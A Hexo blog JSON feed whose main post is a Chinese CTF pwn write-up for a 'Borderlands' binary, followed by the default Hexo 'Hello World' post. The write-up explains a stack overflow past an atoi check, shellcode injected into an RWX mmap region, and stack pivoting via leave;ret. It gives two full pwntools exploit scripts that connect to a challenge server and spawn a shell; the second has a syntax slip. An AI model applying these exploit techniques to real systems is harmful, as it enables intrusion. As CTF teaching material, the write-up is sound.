{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/03/10/wp/",
            "url": "http://example.com/2023/03/10/wp/",
            "title": "",
            "date_published": "2023-03-10T08:06:20.120Z",
            "content_html": "<p>题目本身不难，但是由于自身刷题经验不足，走了很多弯路和死胡同</p>\n<h2 id=\"题目保护\"><a href=\"#题目保护\" class=\"headerlink\" title=\"题目保护\"></a>题目保护</h2><p><img src=\"http://www.ywwokys.top/wp-content/uploads/2023/01/PQVVO9HO18__OVUQCF.png\" alt=\"图片\"></p>\n<p>没开canary但有nx</p>\n<h2 id=\"level1\"><a href=\"#level1\" class=\"headerlink\" title=\"level1\"></a>level1</h2><p>异或梭哈问题不大</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string = &#x27;pvlg`&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">flag = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(5):</span><br><span class=\"line\">    flag += chr(ord(string[i]) ^ i)</span><br><span class=\"line\">print(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"># pwndd</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"level2\"><a href=\"#level2\" class=\"headerlink\" title=\"level2\"></a>level2</h2><p>这个函数的就是从100和99里面随机生成两个数，算法从+-*&#x2F;里面随机，然后组成一个简单的数学题目，输入正确的答案就不会exit，一开始我想的接收这个数学题目然后计算发送过去</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">114</span>):</span><br><span class=\"line\">    num = []</span><br><span class=\"line\"></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;calculate &quot;</span>)</span><br><span class=\"line\">    calc = io.recv(<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(calc)</span><br><span class=\"line\">    num = calc.split(<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(num)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> num[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;+&#x27;</span>:</span><br><span class=\"line\">        res = <span class=\"built_in\">int</span>(num[<span class=\"number\">0</span>]) + <span class=\"built_in\">int</span>(num[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> num[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;-&#x27;</span>:</span><br><span class=\"line\">        res = <span class=\"built_in\">int</span>(num[<span class=\"number\">0</span>]) - <span class=\"built_in\">int</span>(num[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> num[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;*&#x27;</span>:</span><br><span class=\"line\">        res = <span class=\"built_in\">int</span>(num[<span class=\"number\">0</span>]) * <span class=\"built_in\">int</span>(num[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> num[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;/&#x27;</span>:</span><br><span class=\"line\">        res = <span class=\"built_in\">int</span>(num[<span class=\"number\">0</span>]) / <span class=\"built_in\">int</span>(num[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(res)</span><br><span class=\"line\"></span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(res))</span><br></pre></td></tr></table></figure>\n\n<p>后面发现这个level2里面是有溢出点的，而且没有限制长度，它输入进去之后会通过atoi将s字符串转换成数字，然后和v10对比，v10就是计算后的结果，所以直接溢出覆盖v6和v10让他们相等</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__isoc99_scanf(<span class=\"string\">&quot;%s&quot;</span>, s);</span><br><span class=\"line\">v6 = atoi(s);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( v6 != v10 )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bye bye~&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"http://www.ywwokys.top/wp-content/uploads/2023/01/XS6NJYE6H76I3C774G.png\"></p>\n<p><img src=\"http://www.ywwokys.top/wp-content/uploads/2023/01/61178@CB7I5HC24WE.png\" alt=\"图片\"></p>\n<p>gdb调试，发现偏移量为0x7fffffffe0c8-0x7fffffffe0a5&#x3D;37</p>\n<p><img src=\"http://www.ywwokys.top/wp-content/uploads/2023/01/8RKKFB6C00PS237ON@L.png\"></p>\n<p>ida中可以确定s和v10的位置和大小，这里用直接’\\x00’对atoi函数进行截断，省去调试麻烦</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">res = b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00&#x27;+b&#x27;b&#x27;*0x11+b&#x27;\\x00\\x00\\x00\\x00&#x27;+b&#x27;d&#x27;*8</span><br><span class=\"line\">        v6                                         v1</span><br></pre></td></tr></table></figure>\n\n<p>再让他返回到vuln函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">res = b&#x27;\\x00&#x27;*6+b&#x27;b&#x27;*0x11+b&#x27;\\x00&#x27;*4+b&#x27;d&#x27;*8</span><br><span class=\"line\">res +=p64(0x4015A3)</span><br><span class=\"line\">            vuln</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"vuln\"><a href=\"#vuln\" class=\"headerlink\" title=\"vuln\"></a>vuln</h2><p>这个函数一开始就让读入0x1000的数据到magic上，magic是前面mmap出来的地址，并且权限是可读可写可执行，详细可查mmap函数，那就简单了，直接读shellcode进去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode = asm(&quot;nop;nop;nop;nop&quot;)</span><br><span class=\"line\">shellcode += asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>\n\n<p>然后后面是0x10的溢出，空间太小仅能容纳两个gadget，一般的栈溢出攻击不再适用，于是可以用<a href=\"https://www.cnblogs.com/max1z/p/15299000.html\">栈迁移</a>来解决这个问题。</p>\n<p>0x10个溢出字节刚好可以覆盖rbp和ret两个位置的内存</p>\n<p><img src=\"http://www.ywwokys.top/wp-content/uploads/2023/01/50Y7LD1V@EHRRI5R.png\" alt=\"图片\"></p>\n<p>覆盖rbp为地址（0x4040d8-8），覆盖ret为地址0x40139b（leave ret）</p>\n<p>即可实现栈迁移，执行shellcode</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">context.os = &quot;linux&quot;</span><br><span class=\"line\">context.arch = &#x27;amd64&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(&quot;./land&quot;)</span><br><span class=\"line\">io = remote(&#x27;1.15.68.252&#x27;,10000)</span><br><span class=\"line\">elf = ELF(&#x27;./land&#x27;)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\"># gdb.attach(io)</span><br><span class=\"line\">sleep(1)</span><br><span class=\"line\">io.recvuntil(b&quot;want in Borderlands!&quot;)</span><br><span class=\"line\">io.sendline(b&quot;pwndd&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&quot;calculate &quot;)</span><br><span class=\"line\">res = b&#x27;\\x00&#x27;*6+b&#x27;b&#x27;*0x11+b&#x27;\\x00&#x27;*4+b&#x27;d&#x27;*8</span><br><span class=\"line\">res +=p64(0x4015A3)</span><br><span class=\"line\">io.sendline(res)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(&quot;nop;nop;nop;nop&quot;)</span><br><span class=\"line\">shellcode += asm(shellcraft.sh())</span><br><span class=\"line\">io.sendline(shellcode)</span><br><span class=\"line\"># print(len(shellcode))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&#x27;a&#x27; * 0x50 + p64(0x4040D8-0x8) + p64(0x40139b)</span><br><span class=\"line\">io.recvuntil(b&quot;get to the Borderlands&quot;)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">sleep(1)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"http://www.ywwokys.top/wp-content/uploads/2023/01/1.png\" alt=\"nn\"></p>\n<h2 id=\"反思\"><a href=\"#反思\" class=\"headerlink\" title=\"反思\"></a>反思</h2><p>写wp的时候发现了简单方法</p>\n<p><img src=\"http://www.ywwokys.top/wp-content/uploads/2023/01/2.png\"></p>\n<p>level1函数中的scanf函数存在溢出，将ret改为vuln函数地址，可以直接跳转到vuln函数，绕过level1和level2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = b’a‘*22+p64(0x4015A3)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">context.os = &quot;linux&quot;</span><br><span class=\"line\">context.arch = &#x27;amd64&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(&quot;./borderlands&quot;)</span><br><span class=\"line\">io = remote(&#x27;1.15.68.252&#x27;,10000)</span><br><span class=\"line\">elf = ELF(&#x27;./land&#x27;)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\"># gdb.attach(io)</span><br><span class=\"line\">sleep(1)</span><br><span class=\"line\">io.recvuntil(b&quot;want in Borderlands!&quot;)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*22+p64(0x4015a3)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh()</span><br><span class=\"line\">io.sendline(shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&#x27;a&#x27; * 0x50 + p64(0x4040D8-0x8) + p64(0x40139b)</span><br><span class=\"line\">io.recvuntil(b&quot;get to the Borderlands&quot;)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">sleep(1)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://example.com/2023/03/10/hello-world/",
            "url": "http://example.com/2023/03/10/hello-world/",
            "title": "Hello World",
            "date_published": "2023-03-10T07:31:45.921Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}